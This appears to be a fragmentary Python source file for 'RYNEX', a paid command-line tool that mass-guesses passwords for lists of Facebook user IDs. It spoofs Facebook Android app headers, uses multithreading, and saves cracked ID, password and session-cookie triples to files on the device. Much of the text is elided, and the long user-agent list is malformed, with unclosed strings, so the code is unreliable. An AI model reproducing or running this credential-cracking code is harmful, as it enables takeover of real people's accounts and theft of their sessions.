...
os.system('clear')
print('    \x1b[1;96m      \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m \x1b[1;96m WELCOME TO RYNEX COMMAND  \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m\n')
print('  \x1b[0m ╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0mRYNEX Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ─────────────╮')
...
try:
    ...
    os.system('pip install mechanize > /RYNEX/BRAND')
...
def iAmMethod4Ua():
	...
	ua =random.choice(["",])
	return ua
sys.stdout.write('\x1b]2; RYNEX_BRAND\x01')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo = (f'''\033[1;37m      
 ...
 _______           _        _______                ______   _______  _______  _        ______  
...
| (\ (      ) (   | | \   || (       / ( ) \      | (  \ \ | (\ (   | (   ) || | \   || |   ) |
| ) \ \__   | |   | )  \  || (____/\( /   \ )     | )___) )| ) \ \__| )   ( || )  \  || (__/  )
|/   \__/   \_/   |/    )_)(_______/|/     \|_____|/ \___/ |/   \__/|/     \||/    )_)(______/ 
                                            (_____)                                            
                                                                
---------------------------------------------------
 [•] \033[1;37mOwner     :   RYNEX_BRAND
 [•] Github    :   RYNEX_BRAND
 [•] Status    :   Paid
 [•] Tool      :   Public
 [•] Facebook  :   RYNEX BRAND
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(35*'─')
        input("Press enter to back RYNEX Menu ")
        exit()
os.system("speak 'WELCOME TO RYNEX COMMAND'")
def Hamza():   
    os.system('clear')
    print(logo) 
    print(35*'─')
...
class main_crack():
    ...
    def crack(self,id):
        ...
        clear()
        print(45*'─')
        print(" [•] Put File Path Example : /sdcard/RYNEX.txt ")
        print(45*'─')
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RYNEX] {loop} [M-1] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m]  {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RYNEXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SUSHANTb};{ckkk}"
                    print(f"\r{R} [RYNEX-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RYNEX_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RYNEX_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
              #       print(f"\r\x1b[1;96m [RYNEX-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RYNEX_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [RYNEX] {loop}  [M3] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ...
            RYNEX_ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-M215F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RYNEX-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RYNEX_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RYNEX_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r\x1b[1;96m [RYNEX-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RYNEX] {loop}  [M2] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            ...
            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["https://www.facebook.com/rohan.tharu.5203", "com.facebook.orca","messenger-android", "com.facebook.lite"])
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[0m─────────────────────────────────────")
            with HamzaRYNEX(max_workers=30) as RYNEXworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RYNEXworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RYNEXworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RYNEXworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RYNEXworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
  #####_____KEY-SETUP_____#####
def getKey():
    ...
    return "RYNEX-"+myid+xp
km=('https://github.com/rynex-brand/rynex-brand.git')
def xi():
    global km
    j=getKey()
...
def Activate():
    ...
    if k in r:
        ...
        print(f" [•] Your Token is successfully Approved")
                ...
                print(f" [•] YOUR KEY: "+k)
                print(35*'─')
                print(f" [•] NOTE    : WELCOME TO RYNEX TOOL")
                print(35*'─')
...
ua = "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
...
ua = "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
...
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1
...
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15
ua = "Mozilla/5.0 (Linux; Android 11; Samsung SM-A025G) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19
ua = "Mozilla/5.0 (Linux; Android 11; SM-A426U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
...
ua = "Mozilla/5.0 (Linux; Android 11; SM-M127N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; SM-G9910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36
...
ua = "Mozilla/5.0 (Linux; Android 10; motorola one 5G ace Build/QZK30.Q4-40-55; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOM30.255-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; moto g(50) Build/RRFS31.Q1-59-76-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 EdgW/1.0
ua = "Mozilla/5.0 (Linux; Android 10; moto g play (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 10; NOH-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; U; Android 10; zh-cn; BRQ-AN00 Build/HUAWEIBRQ-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/11.9 Mobile Safari/537.36 COVC/045717
ua = "Mozilla/5.0 (Linux; Android 10; Nokia C1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; V2108) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOM30.255-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; V2045) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; Pixel 4a Build/RP1A.200720.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36
ua = "Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.3
...
ua = "Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.3
ua = "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15
...
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/92.0.4515.90 Mobile/15E148 Safari/604.1
...
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1
ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1
ua = "Mozilla/5.0 (iPhone12,8; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1
ua = "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1 
